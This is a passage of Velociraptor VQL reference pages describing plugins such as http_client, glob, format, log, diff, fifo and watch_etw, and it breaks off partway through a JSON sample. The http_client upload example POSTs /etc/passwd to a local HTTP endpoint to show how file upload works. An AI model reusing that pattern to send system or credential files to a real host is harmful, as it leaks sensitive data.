When connecting to the Velociraptor frontend itself, even in self
signed mode, we will ensure certs are properly verified. You can
therefore safely export files from the Frontend's public directory
over self signed SSL. When connecting to a self signed Velociraptor
frontend, we ensure the self signed certificate was issued by the
Velociraptor internal CA - i.e. we pin the Frontend's certificate in
the binary.

{{% /notice %}}

The `http_client()` plugin allows use to interact with any web
services. If the web service returns a json blob, we can parse it
with the `parse_json()` function (or `parse_xml()` for SOAP
endpoints). Using the parameters with a POST method we may
actually invoke actions from within VQL (e.g. send an SMS via an
SMS gateway when a VQL event is received). So this is a very
powerful plugin - see examples below.

When the `tempfile_extension` parameter is provided, the HTTP
response body will be written to a tempfile with that
extension. The name of this tempfile will be emitted as the
`Content` column.

This plugin will emit rows with the following columns:
* Url      string: The url we fetched.
* Content  string: The body content for this chunk
* Response int: The HTTP response code (200=success)

### Example

The following VQL returns the client's external IP as seen by the
externalip service.

```vql
SELECT Content as IP from http_client(url='http://www.myexternalip.com/raw')
```

You can use this plugin to download file contents by passing the
`tempfile_extension` parameter. In this case this plugin will
create a new temp file with the specified extension, write the
content of the HTTP request into it and then emit a row with
`Content` being the name of the file. The file will be
automatically removed when the query ends.

### Example - Uploading files

Many API handlers support uploading files via POST messages. This
is supported using the `files` parameter for this plugin. The
plugin will automatically switch to `multipart/form` mode and
stream the file content. This allows you to upload very large
files with minimal memory impact. Here is an example:

```vql
SELECT *
FROM http_client(
    url='http://localhost:8002/test/',
    method='POST',
    files=dict(file='file.txt', key='file', path='/etc/passwd', accessor="file")
)
```
Here the files can be an array of dicts with the following fields:
* file: The name of the file that will be stored on the server
* key: The name of the form element that will receive the file
* path: This is an OSPath object that we open and stream into the form.
* accessor: Any accessor required for the path.



---END OF FILE---

======
FILE: /content/vql_reference/popular/chain/_index.md
======
---
title: chain
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## chain
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
async|If specified we run all queries asynchronously and combine the output.|bool

### Description

Chain the output of several queries into the same table.

This plugin takes a number of queries and joins their output into
the same table.

You can provide the `async=TRUE` parameter to run the queries in
parallel. This is needed when queries are event queries that never
terminate. You can use this property to collect the output from
multiple event plugins into the same artifact output.

### Example

The following returns the rows from the first query then the rows from
the second query.

```vql
SELECT * FROM chain(
  a={ SELECT ...},
  b={ SELECT ...},
  async=TRUE)
```



---END OF FILE---

======
FILE: /content/vql_reference/popular/len/_index.md
======
---
title: len
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## len
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
list|A list of items to filter|Any (required)

### Description

Returns the length of an object.

For strings, this is the number of bytes.
For arrays, this is the number of entries.
For dicts, this is the number of key/value pairs.



---END OF FILE---

======
FILE: /content/vql_reference/popular/format/_index.md
======
---
title: format
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## format
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
format|Format string to use|string (required)
args|An array of elements to apply into the format string.|Any

### Description

Format one or more items according to a format string.

This function is essentially a wrapper around Golang's fmt.Sprintf()
function and uses the same format specifiers, which are documented
[here](https://pkg.go.dev/fmt).

The following format 'verbs' are often useful:

- `%v` the general purpose stringifier and can apply to strings, ints etc.
- `%x` will hex print the string.
- `%T` will reveal the internal type of an object.
- `%d` provides the decimal (base 10) representation.
- `%o` provides the octal (base 8) representation.

If you are passing a single variable in the `args` argument then the array
notation can be omitted. That is `args=my_var` can be specified instead
of `args=[my_var]`.

### Examples

**1. Positional argument interpolation**

Here the arguments are substituted in order.

```vql
LET csv <= '''John,ate,banana
Mary,had,little lamb'''
LET my_words <= SELECT * FROM parse_csv(accessor="data", filename=csv, auto_headers=True)
SELECT format(format="%v %v a %v.", args=[Col0, Col1, Col2]) AS Sentence FROM my_words
```
returns:\
`Sentence: John ate a banana.`\
`Sentence: Mary had a little lamb.`

**2. Indexed argument interpolation**

Here the arguments are substituted according to their positional index number
(1-indexed).

```vql
SELECT format(format='%[2]v %[1]v, or %[3]v %[2]v %[1]v.',
  args=('be', 'to', 'not', )) FROM scope()
```
returns:\
`to be, or not to be.`

Note that the same argument can be used more than once.

**3. Timestamp formatting**

```vql
LET T <= timestamp(epoch="2024-02-02T04:42:00Z")
SELECT format(format="%d-%02d-%02dT%02d:%02d:%06.3fZ", args=[
  T.Year, T.Month, T.Day, T.Hour, T.Minute, T.Nanosecond / 1000000000 ])
FROM scope()
```
returns:\
`2024-02-02T04:42:00.000Z`

Note that the `timestamp_format` function provides the same string
formatting for timestamps using a much simpler syntax, but `format` is available
for advanced use cases.

### See also

- [log]({{< ref "/vql_reference/popular/log/" >}}): a function which uses the same string
  formatting as the `format` function.
- [timestamp_format]({{< ref "/vql_reference/other/timestamp_format/" >}}): a function
  that simplifies the string formatting of timestamp objects.
- [ip]({{< ref "/vql_reference/other/ip/" >}}): Format an IP address.
- [typeof]({{< ref "/vql_reference/other/typeof/" >}}): a dedicated function equivalent
  to the special use case: `format(format="%T",args=x)`



---END OF FILE---

======
FILE: /content/vql_reference/popular/glob/_index.md
======
---
title: glob
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## glob
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
globs|One or more glob patterns to apply to the filesystem.|list of string (required)
root|The root directory to glob from (default '').|OSPath
accessor|An accessor to use.|string
nosymlink|If set we do not follow symlinks.|bool
recursion_callback|A VQL function that determines if a directory should be recursed (e.g. "x=>NOT x.Name =~ 'proc'").|string
one_filesystem|If set we do not follow links to other filesystems.|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Retrieve files based on a list of glob expressions

The `glob()` plugin is one of the most used plugins. It applies a glob
expression in order to search for files by file name. The glob
expression allows for wildcards, alternatives and character
classes. Globs support both forward and backslashes as path
separators. They also support quoting to delimit components.

A glob expression consists of a sequence of components separated by
path separators. If a separator is included within a component it is
possible to quote the component to keep it together. For example, the
windows registry contains keys with forward slash in their
names. Therefore we may use these to prevent the glob from getting
confused:

```
HKEY_LOCAL_MACHINE\Microsoft\Windows\"Some Key With http://www.microsoft.com/"\Some Value
```

Glob expressions are case insensitive and may contain the following wild cards:

* The `*` matches one or more characters.
* The `?` matches a single character.
* Alternatives are denoted by braces and comma delimited: `{a,b}`
* Recursive search is denoted by a `**`. By default this searches 3 directories deep. If you need to increase it you can add a depth number (e.g. `**10`)

By default globs do not expand environment variables. If you need to
expand environment variables use the `expand()` function explicitly:

```vql
glob(globs=expand(string="%SystemRoot%\System32\Winevt\Logs\*"))
```

### Example

The following searches the raw NTFS disk for event logs.

```vql
SELECT FullPath FROM glob(
globs="C:\Windows\System32\Winevt\Logs\*.evtx",
accessor="ntfs")
```

### The root parameter

If the root parameter is specified, we start globbing from this
directory - i.e. the glob pattern is appended to the root
parameter.  The `root` parameter is useful if the directory name
itself may contain glob characters.

### Following symlinks

On Unix like operating systems symlinks are used
extensively. Symlinks complicate the job of the glob() plugin
because they break the assumption that filesystems are
trees. Instead a symlink may form a cycle or create very deep
directories within the filesystem.

By default glob() follows symlinks but also checks for cycles by
checking that a target of a symlink has not been seen before. You
can disable this behavior with `nosymlink=TRUE`

### Setting a recursion callback

Sometimes it is useful to prevent glob() from recursing into a
directory. For example, if we know a directory can not possibly
contain a hit we can avoid descending into it at all. This more
efficient than simply eliminating the matching rows in the WHERE
clause.

You can provide a recursion callback (in the form of a VQL lambda
function) to let glob() know if it should be recursing a
directory. The glob() plugin will call the lambda with current
directory entry and if the lambda returns a `true` value will
recurse into it.

For example consider the following query which searches for pem
files in all directories other than /proc, /sys or /snap

```vql
SELECT * FROM glob(globs='/**/*.pem',
    recursion_callback="x=>NOT x.OSPath =~ '^/(proc|sys|snap)'")
```

### A note about escaping.

Windows paths often contain backslashes which are difficult to
work with because they need to be escaped both by regular
expressions **and** VQL strings.

This means that trying to add a recursion callback will expand
each backslash into 8 backslashes (once for regular expressions
and twice for nested strings).

```vql
SELECT * FROM glob(
  globs="C:/Users/*/*",
  recursion_callback="x=> NOT x.OSPath =~ 'C:\\\\\\\\Users\\\\\\\\Admini'")
```

It is a bit easier to use variables and raw strings

```vql
LET Exclude <= '''C:\\Users\\Admin'''

SELECT * FROM glob(
  globs="C:/Users/*/*",
  recursion_callback="x=> NOT x.OSPath =~ Exclude")
```



---END OF FILE---

======
FILE: /content/vql_reference/popular/netstat/_index.md
======
---
title: netstat
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## netstat
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Collect network information.


---END OF FILE---

======
FILE: /content/vql_reference/popular/column_filter/_index.md
======
---
title: column_filter
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## column_filter
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
query|This query will be run to produce the columns.|StoredQuery (required)
exclude|One of more regular expressions that will exclude columns.|list of string
include|One of more regular expressions that will include columns.|list of string

### Description

Select columns from another query using regex.

Sometimes a query produces a large number of columns or
unpredictable column names (eg. the `read_reg_key()` plugin
produces a column per value name).

You can use the column_filter() plugin to select a subset of the
columns to include or exclude from an underlying query. For example:

```vql
SELECT * FROM column_filter(
query={
   SELECT 1 AS A, 2 AS B, 3 AS AB, 4 AS AA
   FROM scope()
}, include="A", exclude="B")
```

will include columns with the letter A in their name and remove
columns with the letter B (so it will have A and AA above).



---END OF FILE---

======
FILE: /content/vql_reference/popular/join/_index.md
======
---
title: join
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## join
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
array|The array to join|list of string (required)
sep|The separator. Defaults to an empty string if not explicitly set|string

### Description

Join all the args on a separator.

Joins the array into a string separated by the sep character.



---END OF FILE---

======
FILE: /content/vql_reference/popular/substr/_index.md
======
---
title: substr
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## substr
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
str|The string to shorten|string (required)
start|Beginning index of substring|int
end|End index of substring|int

### Description

Create a substring from a string

If start is not provided, the beginning of the string is used.
If end is not provided, the end of the string are used.



---END OF FILE---

======
FILE: /content/vql_reference/popular/sigma/_index.md
======
---
title: sigma
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## sigma
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
rules|A list of sigma rules to compile.|list of string (required)
log_sources|A log source object as obtained from the sigma_log_sources() VQL function.|Any (required)
field_mapping|A dict containing a mapping between a rule field name and a VQL Lambda to get the value of the field from the event.|ordereddict.Dict
debug|If enabled we emit all match objects with description of what would match.|bool
rule_filter|If specified we use this callback to filter the rules for inclusion.|Lambda
default_details|If specified we use this callback to determine a details column if the sigma rule does not specify it.|Lambda

### Description

Evaluate sigma rules.


---END OF FILE---

======
FILE: /content/vql_reference/popular/log/_index.md
======
---
title: log
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## log
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
message|Message to log.|string (required)
dedup|Suppress same message in this many seconds (default 60 sec). Use -1 to disable dedup.|int64
args|An array of elements to apply into the format string.|Any
level|Level to log at (DEFAULT, WARN, ERROR, INFO, DEBUG).|string

### Description

Log a message to the query log stream. Always returns TRUE.

The `message` parameter represents a format string
that will be expanded using the `args` parameter list if needed.

Since `log()` always returns TRUE it is easy to use in a WHERE
clause as a form of debugging. It is basically equivalent to the
print statement of other languages.

```vql
SELECT * FROM glob(...)
WHERE log(message="Value of OSPath is %v", args=OSPath)
```

### Deduplication

Log messages will be deduped according to the `dedup`
parameter - each **distinct format string** will not be emitted more
frequently than the `dedup` parameter (by default 60 seconds).

This makes it safe to use `log()` frequently without flooding
the logs stream.

```vql
SELECT * FROM range(end=_value)
WHERE log(message="Value is %v", args=_value)
```

Will only emit a single message due to the format string being
deduped.

This property makes it useful to add progress logging to long
running artifacts. The logs will be emitted every minute.

```vql
SELECT * FROM glob(...)
WHERE log(message="Processing file %v", args=OSPath)
```

### Example

In this more complex example the query will produce 10 rows, at a rate of
1 row every 5 seconds. However the log messages will be limited to 1 every
15 seconds.

```vql
SELECT count() AS Count, String AS EventTime FROM clock(period=5)
WHERE log(message="Logging #%v at %v", args=[Count, EventTime], level="INFO", dedup=15)
LIMIT 10
```

Thus the log message will be emitted for the 1st, 4th, 7th, and 10th rows.
To observe the deduplication behaviour in real time you can run this query
in a notebook cell and tweak the arguments to understand their impacts.

### See also

- [format]({{< ref "/vql_reference/popular/format/" >}}): a function that uses the same
  string formatting syntax.
- [alert]({{< ref "/vql_reference/other/alert/" >}}): alerts are a special type of log
  message that are added to a server alerts queue, which can be monitored.



---END OF FILE---

======
FILE: /content/vql_reference/popular/str/_index.md
======
---
title: str
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## str
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
str|The string to normalize|Any (required)

### Description

Returns the string representation of the provided data

### Notes

Most objects have a `.String` method that should return a similar result to
the `str()` function.

### See also

- [serialize]({{< ref "/vql_reference/other/serialize/" >}}): Encode an
  object as a string.



---END OF FILE---

======
FILE: /content/vql_reference/popular/stat/_index.md
======
---
title: stat
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## stat
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|One or more files to open.|OSPath (required)
accessor|An accessor to use.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Get file information. Unlike glob() this does not support wildcards.


---END OF FILE---

======
FILE: /content/vql_reference/popular/if/_index.md
======
---
title: if
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## if
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
condition||Any (required)
then||types.LazyAny
else||types.LazyAny

### Description

Conditional execution of query

This function evaluates a condition. Note that the values used in the
`then` or `else` clause are evaluated lazily. They may be expressions
that involve stored queries (i.e. queries stored using the `LET`
keyword). These queries will not be evaluated if they are not needed.

This allows a query to cheaply branch. For example, if a parameter is
given, then perform hash or upload to the server.




<div class="vql_item"></div>


## if
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
condition||Any (required)
then||StoredQuery (required)
else||StoredQuery

### Description

Conditional execution of query

This function evaluates a condition. Note that the values used in the
`then` or `else` clause are evaluated lazily. They may be expressions
that involve stored queries (i.e. queries stored using the `LET`
keyword). These queries will not be evaluated if they are not needed.

This allows a query to cheaply branch. For example, if a parameter is
given, then perform hash or upload to the server. See the
`Windows.Search.FileFinder` for an example of how `if()` is used.



---END OF FILE---

======
FILE: /content/vql_reference/event/_index.md
======
---
title: Event Plugins
weight: 70
linktitle: Event Plugins
index: true
no_edit: true
no_children: true
---

VQL Event plugins are plugins which never terminate - but instead generate
rows based on events.

Event plugins are useful for creating monitoring artifacts, both on clients
and on the server.
|Plugin/Function|<span class='vql_type'>Type</span>|Description|
|-|-|-|
|[clock](clock)|<span class='vql_type'>Plugin</span>|Generate a timestamp periodically|
|[diff](diff)|<span class='vql_type'>Plugin</span>|Executes 'query' periodically and emit differences from the last query|
|[fifo](fifo)|<span class='vql_type'>Plugin</span>|Executes 'query' and cache a number of rows from it|
|[watch_auditd](watch_auditd)|<span class='vql_type'>Plugin</span>|Watch log files generated by auditd|
|[watch_csv](watch_csv)|<span class='vql_type'>Plugin</span>|Watch a CSV file and stream events from it|
|[watch_etw](watch_etw)|<span class='vql_type'>Plugin</span>|Watch for events from an ETW provider|
|[watch_evtx](watch_evtx)|<span class='vql_type'>Plugin</span>|Watch an EVTX file and stream events from it|
|[watch_journald](watch_journald)|<span class='vql_type'>Plugin</span>|Watch a journald file and stream events from it|
|[watch_jsonl](watch_jsonl)|<span class='vql_type'>Plugin</span>|Watch a jsonl file and stream events from it|
|[watch_monitoring](watch_monitoring)|<span class='vql_type'>Plugin</span>|Watch clients' monitoring log|
|[watch_syslog](watch_syslog)|<span class='vql_type'>Plugin</span>|Watch a syslog file and stream events from it|
|[watch_usn](watch_usn)|<span class='vql_type'>Plugin</span>|Watch the USN journal from a device|
|[wmi_events](wmi_events)|<span class='vql_type'>Plugin</span>|Executes an evented WMI queries asynchronously|

---END OF FILE---

======
FILE: /content/vql_reference/event/watch_journald/_index.md
======
---
title: watch_journald
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## watch_journald
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|A list of journal log files to parse.|list of OSPath (required)
accessor|The accessor to use.|string
raw|Emit raw events (not parsed).|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Watch a journald file and stream events from it. 


---END OF FILE---

======
FILE: /content/vql_reference/event/watch_jsonl/_index.md
======
---
title: watch_jsonl
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## watch_jsonl
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|A list of log files to parse.|list of OSPath (required)
accessor|The accessor to use.|string
buffer_size|Maximum size of line buffer.|int

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Watch a jsonl file and stream events from it.


---END OF FILE---

======
FILE: /content/vql_reference/event/clock/_index.md
======
---
title: clock
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## clock
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
start|Start at this time.|Any
period|Wait this many seconds between events.|int64
ms|Wait this many ms between events.|int64

### Description

Generate a timestamp periodically. This is mostly useful for event
queries.

This plugin generates events periodically. The periodicity can be
controlled either via the `period` or the `ms` parameter. Each row
will be a go [time.Time](https://golang.org/pkg/time/#Time)
object. You can access its unix epoch time with the Sec column.

### Example

The following will generate an event every 10 seconds.

```vql
SELECT Second FROM clock(period=10)
```

The `start` parameter can be used to schedule the plugin to start
at a particular time. This can be an integer (which will be
interpreted as seconds since the epoch), a string or a time value.



---END OF FILE---

======
FILE: /content/vql_reference/event/watch_syslog/_index.md
======
---
title: watch_syslog
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## watch_syslog
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|A list of log files to parse.|list of OSPath (required)
accessor|The accessor to use.|string
buffer_size|Maximum size of line buffer.|int

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Watch a syslog file and stream events from it. 


---END OF FILE---

======
FILE: /content/vql_reference/event/wmi_events/_index.md
======
---
title: wmi_events
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## wmi_events
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
query|WMI query to run.|string (required)
namespace|WMI namespace|string (required)
wait|Wait this many seconds for events and then quit.|int64 (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Executes an evented WMI queries asynchronously.

This plugin sets up a [WMI event](https://docs.microsoft.com/en-us/windows/desktop/wmisdk/receiving-a-wmi-event) listener query.



---END OF FILE---

======
FILE: /content/vql_reference/event/watch_auditd/_index.md
======
---
title: watch_auditd
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## watch_auditd
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|A list of log files to parse.|list of OSPath (required)
accessor|The accessor to use.|string
buffer_size|Maximum size of line buffer.|int

### Description

Watch log files generated by auditd.


---END OF FILE---

======
FILE: /content/vql_reference/event/watch_csv/_index.md
======
---
title: watch_csv
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## watch_csv
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|CSV files to open|list of OSPath (required)
accessor|The accessor to use|string
auto_headers|If unset the first row is headers|bool
separator|Comma separator (default ',')|string
comment|The single character that should be considered a comment|string
columns|The columns to use|list of string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Watch a CSV file and stream events from it. Note: This is an event
plugin which does not complete.

This plugin is the event version of `parse_csv()`. When the CSV file
grows this plugin will emit the new rows.



---END OF FILE---

======
FILE: /content/vql_reference/event/watch_evtx/_index.md
======
---
title: watch_evtx
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## watch_evtx
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|A list of event log files to parse.|list of OSPath (required)
accessor|The accessor to use.|string
messagedb|A Message database from https://github.com/Velocidex/evtx-data.|string
workers|If specified we use this many workers to parse the file in parallel (default 1).|int64

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Watch an EVTX file and stream events from it.

This is the Event plugin version of `parse_evtx()`.

{{% notice note %}}

It often takes several seconds for events to be flushed to the event
log and so this plugin's event may be delayed. For some applications
this results in a race condition with the event itself - for example,
files mentioned in the event may already be removed by the time the
event is triggered.

{{% /notice %}}



---END OF FILE---

======
FILE: /content/vql_reference/event/diff/_index.md
======
---
title: diff
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## diff
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
query|Source for cached rows.|StoredQuery (required)
key|The column to use as key.|string (required)
period|Number of seconds between evaluation of the query.|int64

### Description

Executes 'query' periodically and emit differences from the last query.

The `diff()` plugin runs a non-event query periodically and calculates
the difference between its result set from the last run.

This can be used to create event queries which watch for changes from
simpler non-event queries.

The `key` parameter is the name of the column which is used to
determine row equivalency.

{{% notice note %}}

There is only a single equivalence column specified by the `key`
parameter, and it must be a string. If you need to watch multiple
columns you need to create a new column which is the concatenation
of other columns. For example `format(format="%s%d", args=[Name,
Pid])`

{{% /notice %}}

### Example

The following VQL monitors all removable drives and lists files on
newly inserted drives, or files that have been added to removable
drives.

```vql
LET removable_disks = SELECT Name AS Drive, Size
FROM glob(globs="/*", accessor="file")
WHERE Data.Description =~ "Removable"

LET file_listing = SELECT FullPath, Mtime As Modified, Size
FROM glob(globs=Drive+"\\**", accessor="file") LIMIT 1000

SELECT * FROM diff(
  query={ SELECT * FROM foreach(row=removable_disks, query=file_listing) },
  key="FullPath",
  period=10)
  WHERE Diff = "added"
```

### Example - waiting for process exit

Although `diff()` is primarily an event query it can also be
useful in regular client side VQL. For example we might need to
wait for a process to exit before continuing. The following query
blocks until the process list does not contain a process matching
the regex.

```vql
SELECT * FROM diff(key="Name", period=1, query={
   SELECT Name FROM pslist()
   WHERE Name =~ ProcessRegex
})
WHERE Diff =~ "removed"
LIMIT 1
```

This query:

1. Diff will list processes every second looking for process name
   matching the regex.
2. When a process is added or removed, the diff plugin will emit a
   row
3. The query is only interested in a removed process
4. After a single removed process is found the limit is reached
   and the query exits.

Sometimes we need to wait for a subprocess to exist if it detaches
from the terminal immediately but does some work in the background.



---END OF FILE---

======
FILE: /content/vql_reference/event/watch_monitoring/_index.md
======
---
title: watch_monitoring
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## watch_monitoring
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
artifact|The artifact to watch|string (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Watch clients' monitoring log. This is an event plugin. This
plugin will produce events from all clients.



---END OF FILE---

======
FILE: /content/vql_reference/event/fifo/_index.md
======
---
title: fifo
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## fifo
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
query|Source for cached rows.|StoredQuery (required)
max_age|Maximum number of seconds to hold rows in the fifo.|int64
max_rows|Maximum number of rows to hold in the fifo.|int64
flush|If specified we flush all rows from cache after the call.|bool

### Description

Executes 'query' and cache a number of rows from it. For each invocation
we present the set of past rows.

The `fifo()` plugin allows for VQL queries to apply across historical
data. The fifo plugin accepts another event query as parameter, then
retains the last `max_rows` rows from it in an internal queue. Every
subsequent evaluation from the query will return the full set of rows
in the queue. Older rows are expired from the queue according to the
`max_age` parameter.

Fifos are usually used to form queries that look for specific pattern
of behavior. For example, a successful logon followed by failed
logons. In this case the fifo retains the recent history of failed
logons in its internal queue, then when a successful logon occurs we
can check the recent failed ones in its queue.

### Example

The following checks for 5 failed logons followed by a successful
logon.

```vql
LET failed_logon = SELECT EventData as FailedEventData,
   System as FailedSystem
FROM watch_evtx(filename=securityLogFile)
WHERE System.EventID.Value = 4625

LET last_5_events = SELECT FailedEventData, FailedSystem
    FROM fifo(query=failed_logon,
              max_rows=500,
              max_age=atoi(string=failedLogonTimeWindow))

LET success_logon = SELECT EventData as SuccessEventData,
   System as SuccessSystem
FROM watch_evtx(filename=securityLogFile)
WHERE System.EventID.Value = 4624

SELECT * FROM foreach(
  row=success_logon,
  query={
   SELECT SuccessSystem.TimeCreated.SystemTime AS LogonTime,
          SuccessSystem, SuccessEventData,
          enumerate(items=FailedEventData) as FailedEventData,
          FailedSystem, count(items=SuccessSystem) as Count
   FROM last_5_events
   WHERE FailedEventData.SubjectUserName = SuccessEventData.SubjectUserName
   GROUP BY LogonTime
      })  WHERE Count > atoi(string=failureCount)
```



---END OF FILE---

======
FILE: /content/vql_reference/event/watch_etw/_index.md
======
---
title: watch_etw
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## watch_etw
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
name|A session name |string
guid|A Provider GUID to watch |string (required)
any|Any Keywords |uint64
all|All Keywords |uint64
level|Log level (0-5)|int64
stop|If provided we stop watching automatically when this lambda returns true|Lambda
timeout|If provided we stop after this much time|uint64
capture_state|If true, capture the state of the provider when the event is triggered|bool
enable_map_info|Resolving MapInfo with TdhGetEventMapInformation is very expensive and causes events to be dropped so we disabled it by default. Enable with this flag.|bool
description|Description for this GUID provider|string
kernel_tracer_type|A list of event types to fetch from the kernel tracer (can be registry, process, image_load, network, driver, file, thread, handle)|list of string
kernel_tracer_stacks|A list of kernel tracer event types to append stack traces to (can be any of the types accepted by kernel_tracer_type)|list of string

### Description

Watch for events from an ETW provider.

Event Tracing for Windows is a powerful built in monitoring and
eventing system in Windows. This plugin provides an interface to
this capability.

To learn more about ETW see
https://docs.velociraptor.app/blog/2021/2021-08-18-velociraptor-and-etw/
or
https://docs.velociraptor.app/blog/2021/2021-09-03-process-spoofing/

## The NT Kernel Logger

This plugin also provides specialized support for more advanced
loggers. For example the NT Kernel Logger is a special ETW
provider that can report a lot of telemetry.

The NT Kernel Logger is a special ETW session which can monitor
the following event types:

* registry - all registry interactions like keys/values
* process - all processes start/stop
* image_load - dll loading and mapping
* network - inbound/outbound connections
* driver - drivers loaded
* file - file io like opening files/deleting files etc
* handles - Any time a kernel handle is created

Additionally this provider can report a full stack trace for each event.

You can specify this provider by the GUID
`{9E814AAD-3204-11D2-9A82-006008A86939}` or as a shorthand
`kernel`. This will enabled a special ETW session with support for
this special provider.

When this provider is used, you can also specify what kind of
events you want to see using the `kernel_tracer_type`
parameter. This is a list of any of the following keywords
`registry`, `process`, `image_load`, `network`, `driver`, `file`,
`handles`.

Additionally, you can specify which kinds of events will be
decorated with stack traces using the `kernel_tracer_stacks`
parameter.

### Example:

```vql
SELECT * FROM
watch_etw(guid='kernel',
   kernel_tracer_type=['image_load', 'registry', 'file', 'process', 'network'],
   kernel_tracer_stacks=['registry', 'network', 'file', 'process'])
```

An example of a file created by Chrome - This example illustrates
the backtrace reported by the Kernel and decorated by Velociraptor
with the function names (when known).

```json
{
  "System": {
    "ID": 0,
    "ProcessID": 7672,
    "TimeStamp": "2025-01-02T06:21:36.7026893Z",
    "Provider": "{90CBDC39-4A3E-11D1-84F4-0000F80464E3}",
    "OpCode": 64,
    "KernelEventType": "CreateFile"
  },
  "EventData": {
    "IrpPtr": "0xFFFF830E25838598",
    "FileObject": "0xFFFF830E34395DD0",
    "TTID": "1124",
    "CreateOptions": "33554528",
    "FileAttributes": "0",
    "ShareAccess": "7",
